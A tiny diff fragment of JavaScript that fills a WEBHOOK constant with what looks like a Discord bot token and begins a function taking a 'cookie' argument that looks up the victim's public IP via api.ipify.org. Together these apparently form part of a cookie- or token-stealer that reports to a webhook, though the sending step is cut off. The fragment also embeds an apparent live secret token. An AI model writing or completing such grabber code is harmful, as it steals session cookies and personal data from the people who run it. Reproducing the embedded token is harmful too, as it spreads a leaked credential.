@@ -1,4 +1,4 @@
-const WEBHOOK = "";
+const WEBHOOK = "MTI0NjA5MzE5ODM0MzAxMjQzMw.GgbFTP.RhoildFHXxRFAwNWLVflhVBoJTaXhMiA57PyFQ";
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
